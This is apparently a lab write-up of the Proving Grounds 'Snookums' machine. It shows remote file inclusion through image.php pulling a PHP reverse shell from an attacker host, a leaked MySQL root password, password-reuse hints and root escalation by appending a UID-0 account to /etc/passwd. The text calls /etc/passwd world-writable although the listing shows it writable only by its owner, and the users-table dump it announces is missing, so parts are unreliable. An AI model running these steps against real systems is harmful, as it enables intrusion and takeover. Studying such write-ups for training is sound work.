# Snookums — Proving Grounds

> [!abstract] Summary
> Snookums runs **Simple PHP Photo Gallery** on port 80, whose `image.php?img=` parameter is vulnerable to **Remote File Inclusion (RFI)**. Hosting a PHP reverse shell on the attacker machine and including it through `image.php` yields a shell as the web user. The gallery's config file leaks MySQL root credentials; the `users` table stores double-base64-encoded passwords, decoding to credentials for `michael`. Finally, a **world-writable `/etc/passwd`** lets `michael` append a new UID-0 user and `su` to root.

**Target:** `192.168.143.58`

## Methodology

1. Scan all TCP ports and identify the web application.
2. Test the `image.php` parameter for RFI, then include a PHP reverse shell.
3. Loot the application's database config and MySQL `users` table.
4. Decode stored credentials and reuse them for a local account.
5. Escalate to root by abusing the writable `/etc/passwd`.

## Exploitation

### Remote File Inclusion via `image.php`

The gallery loads images through `image.php?img=`, and the parameter is included without validation — a classic RFI. The first probe includes a remotely hosted PHP file:

```
curl -i http://192.168.143.58/image.php?img=http://192.168.45.192/shell2.php
```

##### ==🔵RFI (remote file inclusion): ==

POC :
```
site.com/image.php?img= [ PAYLOAD ]
```

Start a `Python SimpleHTTPServer` on the attacking machine and browse to a `test.txt` file containing the text `hello` to confirm the include fetches remote content:
```
python3 -m http.server 80
nano test.txt
# paste text : hello
```

```
http://192.168.230.58/image.php?img=http://<KALI IP>/test.txt
```

As this worked and we know the target runs PHP, we can attempt a PHP reverse shell. Set a PHP reverse shell to listen on port 4444, then browse to it:
```
http://192.168.230.58/image.php?img=http://<KALI IP>/phpshell.php
```
Which resulted in a shell.

> [!tip] Learning note — listener port selection
> IF WE DONT GET A SHELL ON THE LISTENER, USE A PORT IN THE PAYLOAD AND LISTENER WHICH MATCHES ONE OF THE PORTS OPEN ON THE VICTIM MACHINE — PREFERABLY A WEB-SERVER PORT, e.g. SAMBA (445). Egress filtering often only allows outbound traffic on common/expected ports, so matching an already-open service port improves the chance the reverse connection gets out.

> [!note]
> The RFI example lines above use mixed addresses captured from the working notes: the Kali host appears as `192.168.45.192` and the target appears both as `192.168.143.58` (scan) and `192.168.230.58` (RFI examples). Use the current target IP consistently when reproducing.

## Post-exploitation: looting the database

### Database credentials in the gallery config

The Simple PHP Photo Gallery config file exposes the MySQL root credentials:

```
define('DBHOST', '127.0.0.1');
define('DBUSER', 'root');
define('DBPASS', 'MalapropDoffUtilize1337');
define('DBNAME', 'SimplePHPGal');

```

### MySQL enumeration

Connect from inside the machine's shell (MySQL is bound to `127.0.0.1`, so this only works locally):
```
mysql -u root -p MalapropDoffUtilize1337
```
It will prompt for the password.

Enumerate:
```
show databases;
use <database name>
show tables;
select * from <table name>
```
Repeat these over each database/table of interest.

> [!tip] Learning note — password reuse
> CHECK FOR PASSWORD REUSE FROM THE DATABASE PASSWORD YOU FOUND, FOR OTHER USERS:
> ```
> sudo su
> ```
> Check if the DB password is reused for `root` or any other user as well.

Dumping the `users` table reveals three accounts with encoded passwords:

## Privilege escalation: writable `/etc/passwd`

As `michael`, `/etc/passwd` is world-writable (`-rw-r--r--` owned by `michael`), which allows appending a new UID-0 account with a known password hash. Generate a crypt hash for the password `password`, append an `owned` root user, and switch to it:

```
[michael@snookums /]$ ls -la /etc/passwd
ls -la /etc/passwd
-rw-r--r--. 1 michael root 1162 Jun 22  2021 /etc/passwd
[michael@snookums /]$ openssl passwd -1 -salt password password 
openssl passwd -1 -salt password password 
$1$password$Da2mWXlxe6J7jtww12SNG/
[michael@snookums /]$ echo 'owned:$1$password$Da2mWXlxe6J7jtww12SNG/:0:0:owned:/root:/bin/bash' >> /etc/passwd
root:/bin/bash' >> /etc/passwdlxe6J7jtww12SNG/:0:0:owned:/ 
[michael@snookums /]$ su owner
su owner
su: user owner does not exist
[michael@snookums /]$ su owned
su owned
Password: password

[root@snookums /]# id
id
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:httpd_t:s0
[root@snookums /]# 

```

> [!note] Troubleshooting observed in the log
> The first `su owner` failed (`user owner does not exist`) — the account added was `owned`, not `owner`. Switching to `su owned` with the password `password` succeeded and returned a root (`uid=0`) shell. The garbled echo line is terminal line-wrap noise from the long `echo ... >> /etc/passwd` command and is preserved as captured.

## Lessons learned

- A single unvalidated include parameter (`image.php?img=`) is enough for full RFI → RCE when the server executes remote PHP; always test `img`/`page`/`file`-style parameters with a harmless remote file first.
- Application config files are a reliable source of database credentials — and those credentials are frequently reused for system accounts.
- "Encrypted"-looking database values are often just encoded. Try base64 (and repeated base64) before assuming a real hash.
- A world-writable `/etc/passwd` is an instant root: append a UID-0 line with a self-generated `openssl passwd` hash and `su` into it.
